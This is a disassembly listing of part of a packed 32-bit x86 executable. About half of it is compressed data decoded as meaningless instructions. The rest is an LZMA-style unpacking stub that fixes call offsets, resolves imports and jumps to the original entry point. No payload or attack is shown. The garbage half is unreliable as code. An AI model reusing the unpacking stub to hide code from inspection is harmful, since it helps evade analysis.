  43605b:	81 fe 14 be d7 b6    	cmp    $0xb6d7be14,%esi
  436061:	15 f4 9d 2d e5       	adc    $0xe52d9df4,%eax
  436066:	80 e0 bf             	and    $0xbf,%al
  436069:	f0 df c8             	lock (bad)
  43606c:	c8 6c 6e 62          	enter  $0x6e6c,$0x62
  436070:	1a 45 82             	sbb    -0x7e(%ebp),%al
  436073:	6c                   	insb   (%dx),%es:(%edi)
  436074:	7f ee                	jg     0x436064
  436076:	e3 15                	jecxz  0x43608d
  436078:	95                   	xchg   %eax,%ebp
  436079:	41                   	inc    %ecx
  43607a:	1f                   	pop    %ds
  43607b:	a3 5a e6 a8 8f       	mov    %eax,0x8fa8e65a
  436080:	ec                   	in     (%dx),%al
  436081:	5d                   	pop    %ebp
  436082:	10 c1                	adc    %al,%cl
  436084:	cf                   	iret
  436085:	6f                   	outsl  %ds:(%esi),(%dx)
  436086:	7d a7                	jge    0x43602f
  436088:	ad                   	lods   %ds:(%esi),%eax
  436089:	1d ab 9f 9f bd       	sbb    $0xbd9f9fab,%eax
  43608e:	e8 f2 be d0 98       	call   0x99141f85
  436093:	dc 23                	fsubl  (%ebx)
  436095:	d5 18                	aad    $0x18
  436097:	61                   	popa
  436098:	2b 63 39             	sub    0x39(%ebx),%esp
  43609b:	f2 de c1             	repnz faddp %st,%st(1)
  43609e:	4f                   	dec    %edi
  43609f:	d1 33                	shll   $1,(%ebx)
  4360a1:	e5 aa                	in     $0xaa,%eax
  4360a3:	5e                   	pop    %esi
  4360a4:	1c 7c                	sbb    $0x7c,%al
  4360a6:	1d 00 c8 ad fc       	sbb    $0xfcadc800,%eax
  4360ab:	69 9c 27 22 2e 7a e3 	imul   $0xd4b7c11c,-0x1c85d1de(%edi,%eiz,1),%ebx
  4360b2:	1c c1 b7 d4 
  4360b6:	f7 c7 0e 0a e2 c6    	test   $0xc6e20a0e,%edi
  4360bc:	b7 62                	mov    $0x62,%bh
  4360be:	bf c0 fb 71 1d       	mov    $0x1d71fbc0,%edi
  4360c3:	cc                   	int3
  4360c4:	2a 33                	sub    (%ebx),%dh
  4360c6:	10 e7                	adc    %ah,%bh
  4360c8:	62 e2 bd b1 7b       	(bad)
  4360cd:	ce                   	into
  4360ce:	9e                   	sahf
  4360cf:	9c                   	pushf
  4360d0:	93                   	xchg   %eax,%ebx
  4360d1:	c5 88 a5 89 55 47    	lds    0x475589a5(%eax),%ecx
  4360d7:	5d                   	pop    %ebp
  4360d8:	97                   	xchg   %eax,%edi
  4360d9:	f5                   	cmc
  4360da:	fb                   	sti
  4360db:	87 ac 81 be 19 26 a4 	xchg   %ebp,-0x5bd9e642(%ecx,%eax,4)
  4360e2:	cf                   	iret
  4360e3:	8e ae 5e ef 1c 56    	mov    0x561cef5e(%esi),%gs
  4360e9:	47                   	inc    %edi
  4360ea:	2d f2 ef d8 7e       	sub    $0x7ed8eff2,%eax
  4360ef:	63 be b9 54 48 66    	arpl   %edi,0x664854b9(%esi)
  4360f5:	b8 4a 39 e2 6f       	mov    $0x6fe2394a,%eax
  4360fa:	09 1a                	or     %ebx,(%edx)
  4360fc:	46                   	inc    %esi
  4360fd:	b8 bb d3 62 89       	mov    $0x8962d3bb,%eax
  436102:	95                   	xchg   %eax,%ebp
  436103:	57                   	push   %edi
  436104:	68 08 ab fa 8e       	push   $0x8efaab08
  436109:	d0 f6                	shl    $1,%dh
  43610b:	ce                   	into
  43610c:	33 63 2e             	xor    0x2e(%ebx),%esp
  43610f:	1e                   	push   %ds
  436110:	11 a1 a0 01 44 7f    	adc    %esp,0x7f4401a0(%ecx)
  436116:	7e b3                	jle    0x4360cb
  436118:	1e                   	push   %ds
  436119:	6c                   	insb   (%dx),%es:(%edi)
  43611a:	88 47 8e             	mov    %al,-0x72(%edi)
  43611d:	0c 71                	or     $0x71,%al
  43611f:	dd 11                	fstl   (%ecx)
  436121:	cb                   	lret
  436122:	50                   	push   %eax
  436123:	2c 47                	sub    $0x47,%al
  436125:	c3                   	ret
  436126:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  436127:	8e b1 95 29 1f 2d    	mov    0x2d1f2995(%ecx),%?
  43612d:	b5 d6                	mov    $0xd6,%ch
  43612f:	66 df 78 62          	data16 fistpll 0x62(%eax)
  436133:	c2 ad e4             	ret    $0xe4ad
  436136:	e9 52 ab 4b 28       	jmp    0x288f0c8d
  43613b:	c1 67 38 bb          	shll   $0xbb,0x38(%edi)
  43613f:	74 8d                	je     0x4360ce
  436141:	cc                   	int3
  436142:	e4 8f                	in     $0x8f,%al
  436144:	7c a1                	jl     0x4360e7
  436146:	e4 70                	in     $0x70,%al
  436148:	3b 71 ed             	cmp    -0x13(%ecx),%esi
  43614b:	4a                   	dec    %edx
  43614c:	36 da fa             	ss (bad)
  43614f:	e1 e7                	loope  0x436138
  436151:	1e                   	push   %ds
  436152:	17                   	pop    %ss
  436153:	e2 ea                	loop   0x43613f
  436155:	8e 52 9c             	mov    -0x64(%edx),%ss
  436158:	97                   	xchg   %eax,%edi
  436159:	72 03                	jb     0x43615e
  43615b:	48                   	dec    %eax
  43615c:	5a                   	pop    %edx
  43615d:	09 69 d9             	or     %ebp,-0x27(%ecx)
  436160:	11 ab 27 65 f2 a1    	adc    %ebp,-0x5e0d9ad9(%ebx)
  436166:	16                   	push   %ss
  436167:	ff 48 6f             	decl   0x6f(%eax)
  43616a:	71 71                	jno    0x4361dd
  43616c:	9d                   	popf
  43616d:	90                   	nop
  43616e:	24 7e                	and    $0x7e,%al
  436170:	c4 a1 cf a2 ef 89    	les    -0x76105d31(%ecx),%esp
  436176:	35 f1 09 24 d2       	xor    $0xd22409f1,%eax
  43617b:	22 b9 19 97 14 7a    	and    0x7a149719(%ecx),%bh
  436181:	06                   	push   %es
  436182:	e8 49 79 99 d3       	call   0xd3dcdad0
  436187:	b8 7a 1f 2c 2c       	mov    $0x2c2c1f7a,%eax
  43618c:	be a9 aa be 3d       	mov    $0x3dbeaaa9,%esi
  436191:	96                   	xchg   %eax,%esi
  436192:	97                   	xchg   %eax,%edi
  436193:	f9                   	stc
  436194:	93                   	xchg   %eax,%ebx
  436195:	c8 dc 4e df          	enter  $0x4edc,$0xdf
  436199:	c3                   	ret
  43619a:	00 12                	add    %dl,(%edx)
  43619c:	6b 42 a6 f6          	imul   $0xfffffff6,-0x5a(%edx),%eax
  4361a0:	89 64 54 83          	mov    %esp,-0x7d(%esp,%edx,2)
  4361a4:	82 36 d7             	xorb   $0xd7,(%esi)
  4361a7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4361a8:	2c 5c                	sub    $0x5c,%al
  4361aa:	95                   	xchg   %eax,%ebp
  4361ab:	19 f2                	sbb    %esi,%edx
  4361ad:	b2 49                	mov    $0x49,%dl
  4361af:	08 2a                	or     %ch,(%edx)
  4361b1:	43                   	inc    %ebx
  4361b2:	f5                   	cmc
  4361b3:	fb                   	sti
  4361b4:	b2 55                	mov    $0x55,%dl
  4361b6:	96                   	xchg   %eax,%esi
  4361b7:	0b ad 2e 74 86 63    	or     0x6386742e(%ebp),%ebp
  4361bd:	ea c1 a8 1d 0d c1 db 	ljmp   $0xdbc1,$0xd1da8c1
  4361c4:	aa                   	stos   %al,%es:(%edi)
  4361c5:	35 0a 7d a3 9e       	xor    $0x9ea37d0a,%eax
  4361ca:	c5 71 c5             	lds    -0x3b(%ecx),%esi
  4361cd:	9d                   	popf
  4361ce:	80 12 ce             	adcb   $0xce,(%edx)
  4361d1:	df 05 38 c4 88 43    	filds  0x4388c438
  4361d7:	91                   	xchg   %eax,%ecx
  4361d8:	41                   	inc    %ecx
  4361d9:	16                   	push   %ss
  4361da:	61                   	popa
  4361db:	69 3c 4b d2 44 af 51 	imul   $0x51af44d2,(%ebx,%ecx,2),%edi
  4361e2:	3a aa 03 08 63 1a    	cmp    0x1a630803(%edx),%ch
  4361e8:	39 3e                	cmp    %edi,(%esi)
  4361ea:	28 00                	sub    %al,(%eax)
  4361ec:	be 88 01 40 00       	mov    $0x400188,%esi
  4361f1:	ad                   	lods   %ds:(%esi),%eax
  4361f2:	8b f8                	mov    %eax,%edi
  4361f4:	95                   	xchg   %eax,%ebp
  4361f5:	ad                   	lods   %ds:(%esi),%eax
  4361f6:	91                   	xchg   %eax,%ecx
  4361f7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4361f9:	ad                   	lods   %ds:(%esi),%eax
  4361fa:	b5 1c                	mov    $0x1c,%ch
  4361fc:	f3 ab                	rep stos %eax,%es:(%edi)
  4361fe:	ad                   	lods   %ds:(%esi),%eax
  4361ff:	50                   	push   %eax
  436200:	97                   	xchg   %eax,%edi
  436201:	51                   	push   %ecx
  436202:	58                   	pop    %eax
  436203:	8d 54 85 5c          	lea    0x5c(%ebp,%eax,4),%edx
  436207:	ff 16                	call   *(%esi)
  436209:	72 57                	jb     0x436262
  43620b:	2c 03                	sub    $0x3,%al
  43620d:	73 02                	jae    0x436211
  43620f:	b0 00                	mov    $0x0,%al
  436211:	3c 07                	cmp    $0x7,%al
  436213:	72 02                	jb     0x436217
  436215:	2c 03                	sub    $0x3,%al
  436217:	50                   	push   %eax
  436218:	0f b6 5f ff          	movzbl -0x1(%edi),%ebx
  43621c:	c1 e3 03             	shl    $0x3,%ebx
  43621f:	b3 00                	mov    $0x0,%bl
  436221:	8d 1c 5b             	lea    (%ebx,%ebx,2),%ebx
  436224:	8d 9c 9d 0c 10 00 00 	lea    0x100c(%ebp,%ebx,4),%ebx
  43622b:	b0 01                	mov    $0x1,%al
  43622d:	e3 29                	jecxz  0x436258
  43622f:	8b d7                	mov    %edi,%edx
  436231:	2b 55 0c             	sub    0xc(%ebp),%edx
  436234:	8a 2a                	mov    (%edx),%ch
  436236:	33 d2                	xor    %edx,%edx
  436238:	84 e9                	test   %ch,%cl
  43623a:	0f 95 c6             	setne  %dh
  43623d:	52                   	push   %edx
  43623e:	fe c6                	inc    %dh
  436240:	8a d0                	mov    %al,%dl
  436242:	8d 14 93             	lea    (%ebx,%edx,4),%edx
  436245:	ff 16                	call   *(%esi)
  436247:	5a                   	pop    %edx
  436248:	9f                   	lahf
  436249:	12 c0                	adc    %al,%al
  43624b:	d0 e9                	shr    $1,%cl
  43624d:	74 0e                	je     0x43625d
  43624f:	9e                   	sahf
  436250:	1a f2                	sbb    %dl,%dh
  436252:	74 e4                	je     0x436238
  436254:	b4 00                	mov    $0x0,%ah
  436256:	33 c9                	xor    %ecx,%ecx
  436258:	b5 01                	mov    $0x1,%ch
  43625a:	ff 56 08             	call   *0x8(%esi)
  43625d:	33 c9                	xor    %ecx,%ecx
  43625f:	ff 66 24             	jmp    *0x24(%esi)
  436262:	b1 30                	mov    $0x30,%cl
  436264:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  436267:	03 d1                	add    %ecx,%edx
  436269:	ff 16                	call   *(%esi)
  43626b:	73 4b                	jae    0x4362b8
  43626d:	03 d1                	add    %ecx,%edx
  43626f:	ff 16                	call   *(%esi)
  436271:	72 19                	jb     0x43628c
  436273:	03 d1                	add    %ecx,%edx
  436275:	ff 16                	call   *(%esi)
  436277:	72 29                	jb     0x4362a2
  436279:	3c 07                	cmp    $0x7,%al
  43627b:	b0 09                	mov    $0x9,%al
  43627d:	72 02                	jb     0x436281
  43627f:	b0 0b                	mov    $0xb,%al
  436281:	50                   	push   %eax
  436282:	8b c7                	mov    %edi,%eax
  436284:	2b 45 0c             	sub    0xc(%ebp),%eax
  436287:	8a 00                	mov    (%eax),%al
  436289:	ff 66 20             	jmp    *0x20(%esi)
  43628c:	83 c2 60             	add    $0x60,%edx
  43628f:	ff 16                	call   *(%esi)
  436291:	87 5d 10             	xchg   %ebx,0x10(%ebp)
  436294:	73 0c                	jae    0x4362a2
  436296:	03 d1                	add    %ecx,%edx
  436298:	ff 16                	call   *(%esi)
  43629a:	87 5d 14             	xchg   %ebx,0x14(%ebp)
  43629d:	73 03                	jae    0x4362a2
  43629f:	87 5d 18             	xchg   %ebx,0x18(%ebp)
  4362a2:	3c 07                	cmp    $0x7,%al
  4362a4:	b0 08                	mov    $0x8,%al
  4362a6:	72 02                	jb     0x4362aa
  4362a8:	b0 0b                	mov    $0xb,%al
  4362aa:	50                   	push   %eax
  4362ab:	53                   	push   %ebx
  4362ac:	8b d5                	mov    %ebp,%edx
  4362ae:	03 56 14             	add    0x14(%esi),%edx
  4362b1:	ff 56 0c             	call   *0xc(%esi)
  4362b4:	5b                   	pop    %ebx
  4362b5:	91                   	xchg   %eax,%ecx
  4362b6:	ff 66 3c             	jmp    *0x3c(%esi)
  4362b9:	07                   	pop    %es
  4362ba:	b0 07                	mov    $0x7,%al
  4362bc:	72 02                	jb     0x4362c0
  4362be:	b0 0a                	mov    $0xa,%al
  4362c0:	50                   	push   %eax
  4362c1:	87 5d 10             	xchg   %ebx,0x10(%ebp)
  4362c4:	87 5d 14             	xchg   %ebx,0x14(%ebp)
  4362c7:	89 5d 18             	mov    %ebx,0x18(%ebp)
  4362ca:	8b d5                	mov    %ebp,%edx
  4362cc:	03 56 18             	add    0x18(%esi),%edx
  4362cf:	ff 56 0c             	call   *0xc(%esi)
  4362d2:	6a 03                	push   $0x3
  4362d4:	59                   	pop    %ecx
  4362d5:	50                   	push   %eax
  4362d6:	48                   	dec    %eax
  4362d7:	3b c1                	cmp    %ecx,%eax
  4362d9:	72 02                	jb     0x4362dd
  4362db:	8b c1                	mov    %ecx,%eax
  4362dd:	c1 e0 06             	shl    $0x6,%eax
  4362e0:	b1 40                	mov    $0x40,%cl
  4362e2:	8d 9c 85 7c 03 00 00 	lea    0x37c(%ebp,%eax,4),%ebx
  4362e9:	ff 56 04             	call   *0x4(%esi)
  4362ec:	3c 04                	cmp    $0x4,%al
  4362ee:	8b d8                	mov    %eax,%ebx
  4362f0:	72 5f                	jb     0x436351
  4362f2:	33 db                	xor    %ebx,%ebx
  4362f4:	d1 e8                	shr    $1,%eax
  4362f6:	13 db                	adc    %ebx,%ebx
  4362f8:	48                   	dec    %eax
  4362f9:	43                   	inc    %ebx
  4362fa:	91                   	xchg   %eax,%ecx
  4362fb:	43                   	inc    %ebx
  4362fc:	d3 e3                	shl    %cl,%ebx
  4362fe:	80 f9 05             	cmp    $0x5,%cl
  436301:	8d 94 9d 7c 01 00 00 	lea    0x17c(%ebp,%ebx,4),%edx
  436308:	76 2e                	jbe    0x436338
  43630a:	80 e9 04             	sub    $0x4,%cl
  43630d:	33 c0                	xor    %eax,%eax
  43630f:	8b 55 00             	mov    0x0(%ebp),%edx
  436312:	d1 6d 08             	shrl   $1,0x8(%ebp)
  436315:	8b 12                	mov    (%edx),%edx
  436317:	0f ca                	bswap  %edx
  436319:	2b 55 04             	sub    0x4(%ebp),%edx
  43631c:	03 c0                	add    %eax,%eax
  43631e:	3b 55 08             	cmp    0x8(%ebp),%edx
  436321:	72 07                	jb     0x43632a
  436323:	8b 55 08             	mov    0x8(%ebp),%edx
  436326:	40                   	inc    %eax
  436327:	01 55 04             	add    %edx,0x4(%ebp)
  43632a:	ff 56 10             	call   *0x10(%esi)
  43632d:	e2 e0                	loop   0x43630f
  43632f:	b1 04                	mov    $0x4,%cl
  436331:	d3 e0                	shl    %cl,%eax
  436333:	03 d8                	add    %eax,%ebx
  436335:	8d 55 1c             	lea    0x1c(%ebp),%edx
  436338:	33 c0                	xor    %eax,%eax
  43633a:	53                   	push   %ebx
  43633b:	40                   	inc    %eax
  43633c:	51                   	push   %ecx
  43633d:	d3 e0                	shl    %cl,%eax
  43633f:	8b da                	mov    %edx,%ebx
  436341:	91                   	xchg   %eax,%ecx
  436342:	ff 56 04             	call   *0x4(%esi)
  436345:	33 d2                	xor    %edx,%edx
  436347:	59                   	pop    %ecx
  436348:	d1 e8                	shr    $1,%eax
  43634a:	13 d2                	adc    %edx,%edx
  43634c:	e2 fa                	loop   0x436348
  43634e:	5b                   	pop    %ebx
  43634f:	03 da                	add    %edx,%ebx
  436351:	43                   	inc    %ebx
  436352:	59                   	pop    %ecx
  436353:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  436356:	56                   	push   %esi
  436357:	8b f7                	mov    %edi,%esi
  436359:	2b f3                	sub    %ebx,%esi
  43635b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  43635d:	ac                   	lods   %ds:(%esi),%al
  43635e:	5e                   	pop    %esi
  43635f:	b1 80                	mov    $0x80,%cl
  436361:	aa                   	stos   %al,%es:(%edi)
  436362:	3b 7e 2c             	cmp    0x2c(%esi),%edi
  436365:	73 03                	jae    0x43636a
  436367:	ff 66 28             	jmp    *0x28(%esi)
  43636a:	58                   	pop    %eax
  43636b:	8b 4e 30             	mov    0x30(%esi),%ecx
  43636e:	5f                   	pop    %edi
  43636f:	e3 1b                	jecxz  0x43638c
  436371:	8a 07                	mov    (%edi),%al
  436373:	47                   	inc    %edi
  436374:	04 18                	add    $0x18,%al
  436376:	3c 02                	cmp    $0x2,%al
  436378:	73 f7                	jae    0x436371
  43637a:	8b 07                	mov    (%edi),%eax
  43637c:	3c 05                	cmp    $0x5,%al
  43637e:	75 f1                	jne    0x436371
  436380:	b0 00                	mov    $0x0,%al
  436382:	0f c8                	bswap  %eax
  436384:	03 46 1c             	add    0x1c(%esi),%eax
  436387:	2b c7                	sub    %edi,%eax
  436389:	ab                   	stos   %eax,%es:(%edi)
  43638a:	e2 e5                	loop   0x436371
  43638c:	8b 5e 34             	mov    0x34(%esi),%ebx
  43638f:	8b 76 38             	mov    0x38(%esi),%esi
  436392:	46                   	inc    %esi
  436393:	ad                   	lods   %ds:(%esi),%eax
  436394:	85 c0                	test   %eax,%eax
  436396:	0f 84 84 ae fd ff    	je     0x411220
  43639c:	56                   	push   %esi
  43639d:	97                   	xchg   %eax,%edi
  43639e:	ff 53 fc             	call   *-0x4(%ebx)
  4363a1:	95                   	xchg   %eax,%ebp
  4363a2:	ac                   	lods   %ds:(%esi),%al
  4363a3:	84 c0                	test   %al,%al
  4363a5:	75 fb                	jne    0x4363a2
  4363a7:	38 06                	cmp    %al,(%esi)
  4363a9:	74 e7                	je     0x436392
  4363ab:	8b c6                	mov    %esi,%eax
  4363ad:	79 05                	jns    0x4363b4
  4363af:	46                   	inc    %esi
  4363b0:	33 c0                	xor    %eax,%eax
  4363b2:	66 ad                	lods   %ds:(%esi),%ax
  4363b4:	50                   	push   %eax
  4363b5:	55                   	push   %ebp
  4363b6:	ff 13                	call   *(%ebx)
  4363b8:	ab                   	stos   %eax,%es:(%edi)
  4363b9:	eb e7                	jmp    0x4363a2
  4363bb:	50                   	push   %eax
  4363bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4363bf:	52                   	push   %edx
  4363c0:	c1 e8 0b             	shr    $0xb,%eax
  4363c3:	f7 22                	mull   (%edx)
  4363c5:	8b 55 00             	mov    0x0(%ebp),%edx
  4363c8:	8b 12                	mov    (%edx),%edx
  4363ca:	0f ca                	bswap  %edx
  4363cc:	2b 55 04             	sub    0x4(%ebp),%edx
  4363cf:	3b c2                	cmp    %edx,%eax
  4363d1:	5a                   	pop    %edx
  4363d2:	76 10                	jbe    0x4363e4
  4363d4:	89 45 08             	mov    %eax,0x8(%ebp)
  4363d7:	33 c0                	xor    %eax,%eax
  4363d9:	b4 08                	mov    $0x8,%ah
  4363db:	2b 02                	sub    (%edx),%eax
  4363dd:	c1 e8 05             	shr    $0x5,%eax
  4363e0:	01 02                	add    %eax,(%edx)
  4363e2:	eb 0e                	jmp    0x4363f2
  4363e4:	01 45 04             	add    %eax,0x4(%ebp)
  4363e7:	29 45 08             	sub    %eax,0x8(%ebp)
  4363ea:	8b 02                	mov    (%edx),%eax
  4363ec:	c1 e8 05             	shr    $0x5,%eax
  4363ef:	29 02                	sub    %eax,(%edx)
  4363f1:	f9                   	stc
  4363f2:	58                   	pop    %eax
  4363f3:	9c                   	pushf
  4363f4:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  4363f8:	75 0b                	jne    0x436405
  4363fa:	ff 45 00             	incl   0x0(%ebp)
  4363fd:	c1 65 04 08          	shll   $0x8,0x4(%ebp)
  436401:	c1 65 08 08          	shll   $0x8,0x8(%ebp)
  436405:	9d                   	popf
  436406:	c3                   	ret
  436407:	33 c0                	xor    %eax,%eax
  436409:	40                   	inc    %eax
  43640a:	8d 14 83             	lea    (%ebx,%eax,4),%edx
  43640d:	ff 16                	call   *(%esi)
  43640f:	13 c0                	adc    %eax,%eax
  436411:	3b c1                	cmp    %ecx,%eax
  436413:	72 f5                	jb     0x43640a
  436415:	2b c1                	sub    %ecx,%eax
  436417:	c3                   	ret
  436418:	b1 08                	mov    $0x8,%cl
  43641a:	ff 16                	call   *(%esi)
  43641c:	8d 52 04             	lea    0x4(%edx),%edx
  43641f:	b0 01                	mov    $0x1,%al
  436421:	73 0b                	jae    0x43642e
  436423:	ff 16                	call   *(%esi)
  436425:	b0 09                	mov    $0x9,%al
  436427:	73 05                	jae    0x43642e
  436429:	c1 e1 05             	shl    $0x5,%ecx
  43642c:	b0 11                	mov    $0x11,%al
  43642e:	50                   	push   %eax
  43642f:	8d 1c 82             	lea    (%edx,%eax,4),%ebx
  436432:	ff 56 04             	call   *0x4(%esi)
  436435:	5b                   	pop    %ebx
  436436:	03 c3                	add    %ebx,%eax
  436438:	c3                   	ret
  436439:	00 20                	add    %ah,(%eax)
  43643b:	42                   	inc    %edx
  43643c:	00 08                	add    %cl,(%eax)
  43643e:	20 42 00             	and    %al,0x0(%edx)
  436441:	8c 20                	mov    %fs,(%eax)
  436443:	41                   	inc    %ecx
  436444:	00 10                	add    %dl,(%eax)
  436446:	30 42 00             	xor    %al,0x0(%edx)
	...
  436451:	0e                   	push   %cs
  436452:	00 00                	add    %al,(%eax)
  436454:	00 1e                	add    %bl,(%esi)
	...
  436462:	00 00                	add    %al,(%eax)
  436464:	00 02                	add    %al,(%edx)
  436466:	00 00                	add    %al,(%eax)
  436468:	00 51 64             	add    %dl,0x64(%ecx)
  43646b:	03 00                	add    (%eax),%eax
	...
